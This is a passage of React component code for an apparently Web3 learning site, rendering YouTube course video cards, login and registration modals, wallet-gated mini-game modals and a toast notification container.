                      allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" 
                      allowFullScreen
                    ></iframe>
                  </div>
                  <div className="p-6">
                    <h3 className="text-xl font-semibold mb-3">DeFi Fundamentals</h3>
                    <p className="text-gray-600 dark:text-gray-400">Understanding DeFi protocols</p>
                  </div>
                </div>

                <div className="bg-white dark:bg-gray-800 rounded-lg overflow-hidden shadow-lg">
                  <div className="relative w-full pt-[56.25%]">
                    <iframe 
                      className="absolute top-0 left-0 w-full h-full" 
                      src="https://www.youtube.com/embed/Ho80wOHVVWc" 
                      title="NFT Development" 
                      frameBorder="0" 
                      allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" 
                      allowFullScreen
                    ></iframe>
                  </div>
                  <div className="p-6">
                    <h3 className="text-xl font-semibold mb-3">NFT Development</h3>
                    <p className="text-gray-600 dark:text-gray-400">Create and deploy NFTs</p>
                  </div>
                </div>

                <div className="bg-white dark:bg-gray-800 rounded-lg overflow-hidden shadow-lg">
                  <div className="relative w-full pt-[56.25%]">
                    <iframe 
                      className="absolute top-0 left-0 w-full h-full" 
                      src="https://www.youtube.com/embed/6Gf_kRE4MJU" 
                      title="Smart Contract Security" 
                      frameBorder="0" 
                      allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" 
                      allowFullScreen
                    ></iframe>
                  </div>
                  <div className="p-6">
                    <h3 className="text-xl font-semibold mb-3">Smart Contract Security</h3>
                    <p className="text-gray-600 dark:text-gray-400">Secure your smart contracts</p>
                  </div>
                </div>
              </div>
            </motion.div>
          </motion.div>
        )}
      </AnimatePresence>

      {/* Login Modal */}
      <AnimatePresence>
        {showLoginModal && (
          <motion.div
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            exit={{ opacity: 0 }}
            className="fixed inset-0 bg-black bg-opacity-50 z-50 flex items-center justify-center p-4"
            onClick={() => setShowLoginModal(false)}
          >
            <motion.div
              initial={{ scale: 0.9, opacity: 0 }}
              animate={{ scale: 1, opacity: 1 }}
              exit={{ scale: 0.9, opacity: 0 }}
              className="bg-white dark:bg-gray-900 rounded-lg p-6 w-full max-w-md shadow-xl"
              onClick={e => e.stopPropagation()}
            >
              <div className="flex justify-between items-center mb-4">
                <h2 className="text-xl font-bold">Login</h2>
                <button
                  onClick={() => setShowLoginModal(false)}
                  className="text-gray-500 hover:text-gray-700 dark:text-gray-400 dark:hover:text-gray-200"
                >
                  <X className="h-5 w-5" />
                </button>
              </div>
              <form onSubmit={handleLogin} className="space-y-4">
                <div>
                  <label className="block text-sm font-medium mb-2">
                    Email Address
                  </label>
                  <Input
                    type="email"
                    value={loginCredentials.email}
                    onChange={(e) => setLoginCredentials({ ...loginCredentials, email: e.target.value })}
                    placeholder="Enter your email"
                    className="w-full"
                    autoComplete="email"
                  />
                </div>
                <div>
                  <label className="block text-sm font-medium mb-2">
                    Password
                  </label>
                  <Input
                    type="password"
                    value={loginCredentials.password}
                    onChange={(e) => setLoginCredentials({ ...loginCredentials, password: e.target.value })}
                    placeholder="Enter your password"
                    className="w-full"
                    autoComplete="current-password"
                  />
                </div>
                {loginError && (
                  <p className="text-red-500 text-sm">{loginError}</p>
                )}
                <Button 
                  type="submit" 
                  id="login-btn"
                  className="w-full bg-primary hover:bg-primary/90 text-white"
                >
                  Login
                </Button>
              </form>
              <div className="mt-4 text-center text-sm">
                <p className="text-gray-600 dark:text-gray-400">
                  Don't have an account?{" "}
                  <button
                    onClick={() => {
                      setShowLoginModal(false)
                      setShowRegisterModal(true)
                    }}
                    className="text-primary hover:text-primary/90 font-medium"
                  >
                    Sign up
                  </button>
                </p>
              </div>
            </motion.div>
          </motion.div>
        )}
      </AnimatePresence>

      {/* Register Modal */}
      <AnimatePresence>
        {showRegisterModal && (
          <motion.div
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            exit={{ opacity: 0 }}
            className="fixed inset-0 bg-black bg-opacity-50 z-50 flex items-center justify-center p-4"
            onClick={() => setShowRegisterModal(false)}
          >
            <motion.div
              initial={{ scale: 0.9, opacity: 0 }}
              animate={{ scale: 1, opacity: 1 }}
              exit={{ scale: 0.9, opacity: 0 }}
              className="bg-white dark:bg-gray-900 rounded-lg p-6 w-full max-w-md shadow-xl"
              onClick={e => e.stopPropagation()}
            >
              <div className="flex justify-between items-center mb-4">
                <h2 className="text-xl font-bold">Create Account</h2>
                    <button
                      onClick={() => setShowRegisterModal(false)}
                      className="text-gray-500 hover:text-gray-700 dark:text-gray-400 dark:hover:text-gray-200"
                    >
                  <X className="h-5 w-5" />
                    </button>
                  </div>
              {registerSuccess ? (
                <div className="text-center py-8">
                  <motion.div 
                    initial={{ scale: 0 }}
                    animate={{ scale: 1 }}
                    transition={{ type: "spring", stiffness: 500, damping: 30 }}
                    className="bg-green-100 dark:bg-green-900/30 rounded-full mx-auto mb-4 w-20 h-20 flex items-center justify-center"
                  >
                    <svg className="w-12 h-12 text-green-600" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M5 13l4 4L19 7" />
                    </svg>
                  </motion.div>
                  <h3 className="text-xl font-bold mb-2">Registration Successful!</h3>
                  <p className="mb-4 text-gray-600 dark:text-gray-400">Your account has been created successfully.</p>
                  <Button
                    onClick={() => {
                      setShowRegisterModal(false)
                      setShowLoginModal(true)
                    }}
                    className="bg-primary hover:bg-primary/90 text-white"
                  >
                    Login Now
                  </Button>
                </div>
              ) : (
                <>
                  <form onSubmit={handleRegister} className="space-y-4">
                    <div>
                      <label className="block text-sm font-medium mb-2">
                        Full Name
                      </label>
                      <Input
                        type="text"
                        value={registerCredentials.name}
                        onChange={(e) => setRegisterCredentials({ ...registerCredentials, name: e.target.value })}
                        placeholder="Enter your full name"
                        className="w-full"
                        autoComplete="name"
                      />
                    </div>
                    <div>
                      <label className="block text-sm font-medium mb-2">
                        Email Address
                      </label>
                      <Input
                        type="email"
                        value={registerCredentials.email}
                        onChange={(e) => setRegisterCredentials({ ...registerCredentials, email: e.target.value })}
                        placeholder="Enter your email"
                        className="w-full"
                        autoComplete="email"
                      />
                    </div>
                    <div>
                      <label className="block text-sm font-medium mb-2">
                        Password
                      </label>
                      <Input
                        type="password"
                        value={registerCredentials.password}
                        onChange={(e) => setRegisterCredentials({ ...registerCredentials, password: e.target.value })}
                        placeholder="Create a password"
                        className="w-full"
                        autoComplete="new-password"
                      />
                    </div>
                    <div>
                      <label className="block text-sm font-medium mb-2">
                        Confirm Password
                      </label>
                      <Input
                        type="password"
                        value={registerCredentials.confirmPassword}
                        onChange={(e) => setRegisterCredentials({ ...registerCredentials, confirmPassword: e.target.value })}
                        placeholder="Confirm your password"
                        className="w-full"
                        autoComplete="new-password"
                      />
                    </div>
                    {registerError && (
                      <p className="text-red-500 text-sm">{registerError}</p>
                    )}
                    <Button 
                      type="submit"
                      id="register-btn" 
                      className="w-full bg-primary hover:bg-primary/90 text-white"
                    >
                      Register
                    </Button>
                  </form>
                  <div className="mt-4 text-center text-sm">
                    <p className="text-gray-600 dark:text-gray-400">
                      Already have an account?{" "}
                      <button
                        onClick={() => {
                          setShowRegisterModal(false)
                          setShowLoginModal(true)
                        }}
                        className="text-primary hover:text-primary/90 font-medium"
                      >
                        Login
                      </button>
                    </p>
                  </div>
                </>
              )}
            </motion.div>
          </motion.div>
        )}
      </AnimatePresence>

      {/* Domain Videos Modal */}
      <AnimatePresence>
        {showDomainVideosModal && selectedDomain && (
          <motion.div
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            exit={{ opacity: 0 }}
            className="fixed inset-0 bg-black bg-opacity-50 z-50 flex items-center justify-center p-4"
            onClick={() => setShowDomainVideosModal(false)}
          >
            <motion.div
              initial={{ scale: 0.9, opacity: 0 }}
              animate={{ scale: 1, opacity: 1 }}
              exit={{ scale: 0.9, opacity: 0 }}
              className="bg-white dark:bg-gray-900 rounded-lg p-8 max-w-4xl w-full max-h-[90vh] overflow-y-auto"
              onClick={e => e.stopPropagation()}
            >
              <div className="flex justify-between items-center mb-6">
                <div>
                  <h2 className="text-2xl font-bold">{selectedDomain.title}</h2>
                  <p className="text-gray-600 dark:text-gray-400">{selectedDomain.description}</p>
                </div>
                <button
                  onClick={() => setShowDomainVideosModal(false)}
                  className="text-gray-500 hover:text-gray-700 dark:text-gray-400 dark:hover:text-gray-200"
                >
                  <X className="h-6 w-6" />
                </button>
              </div>
              
              <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6">
                {domainVideos[selectedDomain.title as keyof typeof domainVideos].videos.map((video, index) => (
                  <motion.div
                    key={index}
                    initial={{ opacity: 0, y: 20 }}
                    animate={{ opacity: 1, y: 0 }}
                    transition={{ delay: index * 0.1 }}
                    className="bg-gray-50 dark:bg-gray-800 rounded-lg overflow-hidden hover:shadow-lg transition-shadow"
                  >
                    <div className="relative w-full pt-[56.25%]">
                      <iframe
                        className="absolute top-0 left-0 w-full h-full"
                        src={`https://www.youtube.com/embed/${video.videoId}`}
                        title={video.title}
                        frameBorder="0"
                        allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture"
                        allowFullScreen
                      />
                    </div>
                    <div className="p-4">
                      <h3 className="font-semibold mb-2">{video.title}</h3>
                      <p className="text-sm text-gray-600 dark:text-gray-400">{video.description}</p>
                    </div>
                  </motion.div>
                ))}
              </div>
            </motion.div>
          </motion.div>
        )}
      </AnimatePresence>

      {/* Sudoku Game Modal */}
      {showSudoku && walletAddress && (
        <SudokuGame onClose={() => setShowSudoku(false)} walletAddress={walletAddress} />
      )}

      {/* Puzzle Game Modal */}
      {showPuzzle && walletAddress && (
        <PuzzleGame onClose={() => setShowPuzzle(false)} walletAddress={walletAddress} />
      )}

      {/* Memory Game Modal */}
      {showMemory && walletAddress && (
        <MemoryGame onClose={() => setShowMemory(false)} walletAddress={walletAddress} />
      )}

      {showQuiz && walletAddress && (
        <QuizGame onClose={() => setShowQuiz(false)} walletAddress={walletAddress} />
      )}

      {/* Add CourseVideo component */}
      <AnimatePresence>
        {selectedCourse && (
          <CourseVideo
            courseTitle={selectedCourse.title}
            onClose={() => setSelectedCourse(null)}
            walletAddress={walletAddress}
          />
        )}
      </AnimatePresence>

      {/* Add ToastContainer for notifications */}
      <ToastContainer
        position="bottom-right"
        autoClose={5000}
        hideProgressBar={false}
        newestOnTop
        closeOnClick
        rtl={false}
        pauseOnFocusLoss
        draggable
        pauseOnHover
        theme="colored"
      />
    </div>
  )
}

